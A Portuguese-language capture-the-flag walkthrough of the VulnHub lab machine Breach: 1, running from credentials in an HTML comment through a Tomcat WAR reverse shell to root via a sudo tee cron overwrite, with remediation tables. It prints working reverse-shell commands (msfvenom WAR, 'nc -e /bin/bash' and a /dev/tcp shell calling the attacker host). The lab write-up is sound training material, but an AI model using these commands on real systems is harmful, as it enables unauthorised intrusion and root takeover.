# Breach: 1 — Writeup (PT-BR)

> *Aquele momento em que o IDS faz todas as portas parecerem abertas e o nmap vira uma piada, as creds reais estão double-Base64'd num comentário HTML como se os devs achassem que ninguém lê código-fonte, e o Tomcat tá lá na 8443 pedindo pra você mandar um WAR. Mano, uma das chains mais criativas pra iniciante do VulnHub, sem mentira. Chapéu pra [@mrb3n813](https://twitter.com/mrb3n813) por ter montado esse troço em camadas.*

---

## Metadados da Máquina

| Campo | Valor |
|---|---|
| **Nível** | Iniciante-Intermediário |
| **VM Alvo** | Breach: 1 |
| **VM Atacante** | Kali Linux 2024.x (192.168.110.128) |
| **VulnHub URL** | https://www.vulnhub.com/entry/breach-1,152/ |
| **Técnicas** | Vazamento de credencial em comentário HTML, dupla codificação Base64, descriptografia de tráfego SSL/TLS via JKS keystore, deploy de WAR malicioso no Tomcat, exfiltração de credencial via metadado de imagem, abuso de sudo tee em script de cron |
| **CVEs** | Nenhum (chain de misconfig pura) |
| **Relevância APT** | FIN7 e APT41 abusam de servidores Java mal configurados para acesso inicial; abuso de cron e sudo documentado em implantes Linux do Lazarus Group |

---

## Resumo do Ataque

```
[Atacante: 192.168.110.128]
          |
          v
  nmap -Pn 192.168.110.140
  (IDS enche de ruído: todas as portas parecem abertas)
          |
          v
  HTTP:80 --- view-source: comentário HTML
  double Base64 decode --> usuário:senha (portal do funcionário)
          |
          v
  Login no portal --> caixa de entrada msg #3
  --> download: breach.pcap + tomcat.keystore (JKS)
          |
          v
  keytool: JKS --> PKCS12
  Wireshark: descriptografia SSL (porta 8443)
  --> creds do Tomcat manager + URL do endpoint de upload
          |
          v
  msfvenom WAR (java/jsp_shell_reverse_tcp)
  --> upload via Tomcat manager
  --> acesso a /update --> sessão Meterpreter (www-data)
          |
          v
  /home/milton/bill.png
  exiftool --> Comment: coffeestains
          |
          v
  su blumbergh (senha: coffeestains)
  sudo -l --> NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
          |
          v
  echo "nc -e /bin/bash 192.168.110.128 8443" | sudo tee tidyup.sh
  nc -lvv -p 8443 (aguarda <= 3 min pelo cron)
          |
          v
        [ROOT]
```

---

## Metodologia

1. Descoberta de rede e varredura de portas (ciente do ruído do IDS)
2. Enumeração HTTP manual: análise do código-fonte em busca de blobs de credencial ocultos
3. Login no portal do funcionário, análise das mensagens da caixa de entrada, download dos artefatos (pcap + keystore)
4. Conversão JKS para PKCS12 e descriptografia de stream SSL no Wireshark
5. Geração de WAR malicioso e upload via Tomcat Manager para shell inicial
6. Enumeração do sistema de arquivos: análise de metadados de imagem via exiftool para credenciais laterais
7. Troca de usuário para `blumbergh`, enumeração de permissões sudo, escalada via sobrescrita de cron com `tee`

---

## Passos

### Passo 1: Descoberta de Rede

**Contexto:** O alvo roda um IDS ativo que responde às varreduras marcando a maioria das portas como "abertas", tornando a fingerprinting automatizada pouco confiável. Enumeração HTTP manual na porta 80 é o ponto de partida confiável.

```bash
sudo netdiscover -i eth1 -r 192.168.110.0/24
nmap -Pn 192.168.110.140
```

**Saída esperada:**
```
Host discovery disabled (-Pn). All addresses will be marked 'up'.
Nmap scan report for 192.168.110.140
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
...
(a maioria das portas aparece aberta por causa do IDS)
```

**Alternativas:** `arp-scan -l` para descoberta de host mais limpa sem acionar o IDS; `masscan` com taxa baixa.

**Nota real:** Produtos IDS/IPS de produção (Snort, Suricata, Palo Alto) costumam responder a varreduras agressivas com floods de RST. Pentesters usam varreduras com decoy (`nmap -D`) ou com delay (`--scan-delay`) para reduzir ruído.

**MITRE TTP:** T1595.001 - Active Scanning: Scanning IP Blocks

---

### Passo 2: Enumeração Web: Credenciais Ocultas no Comentário HTML

**Contexto:** Acessando `http://192.168.110.140`, uma homepage corporativa é exibida. Ao ver o código-fonte, há um blob de credencial dentro de um comentário HTML, codificado duas vezes em Base64. Ixi, que descuido.

```bash
# No navegador: Ctrl+U para ver o fonte
# Procurar por: <!-- ... -->
# Extrair a string Base64 e decodificar duas vezes:
echo "BASE64_STRING_AQUI" | base64 -d | base64 -d
```

**Saída esperada:**
```
usuario:senha
```

**Alternativas:** Extensão HackBar no Firefox para decode rápido. `curl http://192.168.110.140 | grep "<!--"`.

**Nota real:** Credenciais em comentários HTML são um achado OWASP Top 10 A02:2021 (Falhas Criptográficas / Exposição de Dados Sensíveis). Ferramentas de análise estática como Semgrep ou truffleHog pegam isso em hooks de pre-commit.

**MITRE TTP:** T1552.001 - Credenciais Não Seguras: Credenciais em Arquivos

---

### Passo 3: Portal do Funcionário, Captura SSL e JKS Keystore

**Contexto:** Faça login no portal com as credenciais decodificadas. A caixa de entrada tem três mensagens; a mensagem 3 inclui um link para um arquivo `.pcap` (captura de tráfego SSL) e um `tomcat.keystore` para download (Java KeyStore, formato JKS). Bingo, rapaziada.

```bash
# Baixar o keystore e o pcap pelos links do portal
# Converter JKS para PKCS12 (Wireshark usa PKCS12 para descriptografar SSL):
keytool -importkeystore \
  -srckeystore tomcat.keystore \
  -destkeystore mykeystore.p12 \
  -deststoretype PKCS12 \
  -srcalias tomcat
# Senha: tomcat
```

**Configurar descriptografia SSL no Wireshark:**
```
Edit --> Preferences --> Protocols --> TLS --> Edit RSA Keys list
IP: 192.168.110.140 | Port: 8443 | Protocol: http | Key file: mykeystore.p12 | Password: tomcat
```

Siga o stream SSL descriptografado. Decodifique quaisquer blobs Base64 encontrados no tráfego HTTP em claro.

**Saída esperada (após decode):**
```
Credenciais Tomcat manager: tomcat:XXXXXXXX
Endpoint de upload: http://192.168.110.140:8443/manager/html
```

**Nota real:** JKS keystores expostos em caminhos acessíveis pela web permitem descriptografar retrospectivamente todas as sessões TLS gravadas. PCI-DSS Requisito 4 e NIST SP 800-52 exigem que material de chave TLS seja armazenado fora do web root e rotacionado regularmente.

**MITRE TTP:** T1552.004 - Credenciais Não Seguras: Chaves Privadas

---

### Passo 4: WAR Reverse Shell via Tomcat Manager

**Contexto:** Com as credenciais do Tomcat Manager e a URL do endpoint de upload, deploy de um WAR malicioso para obter shell como a conta de serviço do Tomcat. Bora rapaziada.

```bash
# Gerar WAR reverse shell:
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.110.128 LPORT=4444 \
  -f war -o update.war
```

**Iniciar handler no Metasploit:**
```
msfconsole -q
use exploit/multi/handler
set payload java/meterpreter/reverse_tcp
set LHOST 192.168.110.128
set LPORT 4444
run
```

**Upload e acionamento:**
```bash
# Fazer upload de update.war via UI web do Tomcat Manager em /manager/html
# Então acessar: http://192.168.110.140:8443/update/
```

**Upgrade para TTY completo:**
```bash
python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
# Ctrl+Z, depois: stty raw -echo; fg
```

**Saída esperada:**
```
[*] Meterpreter session 1 opened
meterpreter> getuid
Server username: www-data
```

**Alternativas:** `curl` ou `python requests` para upload do WAR sem a UI do navegador. `weevely` para webshell PHP alternativo se houver PHP presente.

**Nota real:** Apache Tomcat Manager com credenciais padrão ou fracas é um achado crítico recorrente em ambientes Java corporativos. É explorado rotineiramente por operadores de ransomware (FIN7, afiliados Conti) para deploy de WARs maliciosos visando acesso persistente.

**MITRE TTP:** T1505.003 - Web Shell | T1190 - Exploit em Aplicação Pública

---

### Passo 5: Movimento Lateral via Metadados de Imagem (exiftool)

**Contexto:** Como `www-data`, enumere os diretórios `/home` em busca de arquivos interessantes. Um PNG em `/home/milton/` contém uma senha armazenada no campo de comentário EXIF da imagem. Caramba, quem pensa nisso?

```bash
cd /home/milton
ls -la
exiftool bill.png
```

**Saída esperada:**
```
ExifTool Version Number         : 10.xx
...
Comment                         : coffeestains
```

**Troca de usuário:**
```bash
cat /etc/passwd | grep -v nologin | grep -v false
su blumbergh
# Senha: coffeestains
id
# uid=1001(blumbergh) gid=1001(blumbergh) groups=1001(blumbergh)
```

**Alternativas:** `strings bill.png | grep -i pass`, `binwalk -e bill.png` para dados esteganográficos.

**Nota real:** Aplicativos de câmera, ferramentas de design e scripts customizados rotineiramente escrevem metadados em imagens. Times de segurança usam `exiftool -all= arquivo.jpg` para limpar metadados antes de publicar. LGPD Artigo 46 e GDPR Artigo 5(1)(c) de minimização de dados se aplicam.

**MITRE TTP:** T1552.001 - Credenciais em Arquivos | T1078.003 - Contas Válidas: Contas Locais

---

### Passo 6: Escalada de Privilégio: sudo tee Sobrescreve Script de Cron

**Contexto:** `blumbergh` pode executar `tee` como root via sudo, apontando para um script específico do cron. Isso permite sobrescrever o script com conteúdo arbitrário, que o cron do root vai executar. Top demais essa misconfiguration.

```bash
sudo -l
# User blumbergh may run the following commands:
# (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh

ls -la /usr/share/cleanup/tidyup.sh
# -rwxr-xr-x 1 root root ... /usr/share/cleanup/tidyup.sh

# Verificar timing do cron:
cat /etc/crontab
# */3 * * * * root /usr/share/cleanup/tidyup.sh
```

**Sobrescrever o script e preparar o listener:**
```bash
# No atacante:
nc -lvv -p 8443

# No alvo:
echo "nc -e /bin/bash 192.168.110.128 8443" | sudo tee /usr/share/cleanup/tidyup.sh
# Aguardar até 3 minutos pelo cron disparar
```

**Saída esperada (no listener nc do atacante):**
```
Connection from 192.168.110.140:XXXXX
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/proof.txt
```

**Alternativas:** Usar `bash -i >& /dev/tcp/192.168.110.128/8443 0>&1` no lugar do nc para sistemas sem nc com suporte a `-e`.

**Nota real:** `sudo tee` irrestrito para qualquer caminho gravável é funcionalmente equivalente a escrita arbitrária de arquivo como root. GTFOBins cataloga 60+ binários com potencial de abuso similar. A correção é uma entrada sudoers granular restrita a caminhos seguros e argumentos fixos.

**MITRE TTP:** T1053.005 - Scheduled Task/Job: Cron | T1548.003 - Abuso de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Onde Encontrado | Usado Para |
|---|---|---|---|
| Credencial (Base64) | (decodificado do comentário HTML) | Código-fonte HTTP porta 80 | Login no portal do funcionário |
| Credencial | `tomcat:XXXXXXXX` | Stream SSL Wireshark | Login no Tomcat Manager |
| Credencial | `blumbergh:coffeestains` | EXIF Comment de bill.png | Movimento lateral |
| Root Shell | `uid=0(root)` | Callback do cron | Comprometimento total |

---

## Lições Aprendidas

| Achado | Relevância no Mundo Real |
|---|---|
| Credenciais em comentários HTML (codificadas em Base64) | Codificação não é criptografia. Scanners automatizados de segredos (truffleHog, gitleaks) detectam isso em hooks de pre-commit e em conteúdo web. |
| JKS keystore exposto em caminho acessível pela web | Chaves privadas TLS acessíveis via HTTP permitem descriptografar completamente o tráfego arquivado. Armazene chaves em HSMs ou gerenciadores de segredos (Vault, AWS KMS). |
| Descriptografia SSL via PKCS12 no Wireshark | Times de defesa podem descriptografar TLS internamente para resposta a incidentes com custódia de chaves adequada. Atacantes fazem o mesmo quando as chaves estão expostas. |
| Metadados EXIF de imagem como repositório de credencial | Desenvolvedores às vezes usam comentários de imagem para config "oculta". Limpe metadados antes de publicar com `exiftool -all=`. |
| sudo tee em script de cron de root | Escrita irrestrita de arquivo como root é root. GTFOBins cataloga esse padrão. Audite sudoers com o princípio de menor privilégio em mente. |
| Resposta do IDS criando ruído de varredura | Fingerprinting ativa pelo IDS pode retardar ou enganar atacantes, mas defensores não devem depender disso como controle primário. |

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID |
|---|---|---|
| Reconhecimento | Varredura Ativa: Blocos de IP | T1595.001 |
| Acesso Inicial | Exploit em Aplicação Pública | T1190 |
| Acesso a Credenciais | Credenciais Não Seguras: Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Credenciais Não Seguras: Chaves Privadas | T1552.004 |
| Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Persistência | Componente de Software de Servidor: Web Shell | T1505.003 |
| Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Descoberta | Descoberta de Proprietário/Usuário do Sistema | T1033 |
| Movimento Lateral | Contas Válidas: Contas Locais | T1078.003 |
| Escalada de Privilégio | Tarefa Agendada: Cron | T1053.005 |
| Escalada de Privilégio | Abuso de Controle de Elevação: Sudo | T1548.003 |

---

## Remediação

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | ID.AM-2 | Inventariar todos os diretórios acessíveis pela web; marcar caminhos com material de chave |
| Proteger | PR.AC-4 | Aplicar menor privilégio a todas as contas de serviço e regras sudo |
| Proteger | PR.DS-1 | Criptografar credenciais em repouso; nunca incorporar em código-fonte ou markup |
| Detectar | DE.CM-3 | Monitorar escritas incomuns em `/etc/cron*` e caminhos em `/usr/share/` |
| Responder | RS.AN-3 | Investigar modificações no cron como indicadores potenciais de persistência |

### Controles NIST SP 800-53

| Controle | Requisito | Aplicabilidade |
|---|---|---|
| IA-5 | Gerenciamento de Autenticador | Rotacionar e proteger chaves privadas TLS; não expor keystores |
| AC-6 | Menor Privilégio | Restringir regras sudo a comandos específicos com argumentos fixos |
| CM-7 | Funcionalidade Mínima | Desabilitar Tomcat Manager em produção ou restringir ao localhost |
| AU-12 | Geração de Registro de Auditoria | Registrar uso de sudo, escritas em caminhos sensíveis, alterações no cron |
| SI-3 | Proteção contra Malware | Varrer arquivos enviados; bloquear uploads de WAR de fontes não confiáveis |

### Relevância CISA KEV

Sem CVEs diretos. Porém, o abuso do Tomcat Manager (similar a CVE-2017-12617, CVE-2019-0232) tem entradas no KEV. Tomcat Managers mal configurados são alvos recorrentes de atividade precursora de ransomware.

### C2M2 (Modelo de Maturidade de Capacidade em Cibersegurança)

| Domínio | Prática | Lacuna |
|---|---|---|
| ACM (Ativo, Mudança, Configuração) | ACM-1c | Material de chave no web root = MIL0 |
| IAM (Gerenciamento de Identidade e Acesso) | IAM-2b | Credenciais padrão do Tomcat = MIL0 |
| IR (Resposta a Incidentes) | IR-1c | Sem detecção para modificações no cron = MIL0 |

### Contramedidas MITRE D3FEND

| Técnica D3FEND | ID | Defende Contra |
|---|---|---|
| Regras de Conteúdo de Arquivo | D3-FCR | Detecção de upload de WAR |
| Análise de Comportamento do Usuário | D3-UBA | Uso anômalo de `su` e `tee` |
| Hardening de Credencial | D3-CH | Exposição de keystore, creds em Base64 |
| Análise de Spawn de Processo | D3-PSA | Reverse shell via cron |

---

## Considerações Finais

Pô, Breach: 1 é uma chain completa de misconfig que espelha ambientes Java corporativos reais melhor do que a maioria das máquinas CTF. O herring vermelho do IDS, o Base64 em camadas, o fluxo de descriptografia SSL e o `sudo tee` criativo tornam esse box genuinamente educativo. Se você consegue resolver essa máquina limpa e explicar cada passo, tá ligado que já domina metade de um engajamento de pentest focado em Tomcat. Chain top demais, 10/10, voltaria a dar upload de WAR qualquer dia.

Thanks guys!! (❍ᴥ❍ʋ)
